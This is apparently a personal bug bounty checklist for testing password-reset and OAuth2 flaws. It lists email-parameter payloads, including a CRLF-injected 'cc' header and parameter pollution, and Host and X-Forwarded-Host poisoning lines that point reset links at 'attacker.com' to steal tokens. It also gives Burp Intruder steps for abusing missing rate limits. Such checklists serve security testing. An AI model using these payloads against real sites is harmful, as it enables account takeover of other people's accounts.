# MyBugbountyMethodology

# Password reset/forgot

- Password reset link not expiring
- No rate limiting on password reset
    > Start the burp suite and intercept the password reset request
    
    > Send to intruder
   
    > Use null payload

- Password reset token leak via referer
    > Request password reset to your email address
    
    > Open on the password reset link
    
    > Make sure you don’t change the password there
    
    > On Password Reset Page Click On Social Media Links Given Below And Capture The Request Using Burp Suite
    
    > Check if the referer header is a leaking password reset token?

- Password reset with manipulating email parameter
    
    > email=victim@xyz.tld&email=hacker@xyz.tld
       
    > email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
        
    > email=victim@xyz.tld,hacker@xyz.tld
    
    > email=victim@xyz.tld%20hacker@xyz.tld
    
    > email=victim@xyz.tld|hacker@xyz.tld
    
    > email=victim
    
    > email=victim@xyz
    
    > {“email”:[“victim@xyz.tld”,”hacker@xyz.tld”]}
   
- Password reset Poisoining leads to token leak
    > Host: attacker.comHost: target.com
    
    > X-Forwarded-Host: attacker.comHost: target.com
    
    > Host: attacker.com
   
# Oauth2 vulnerabilities

- CSRF-Improper handling of state parameter

- Weak validation of `redirect-uri` parameter to aut_code leak, xss, open ridirects, etc.
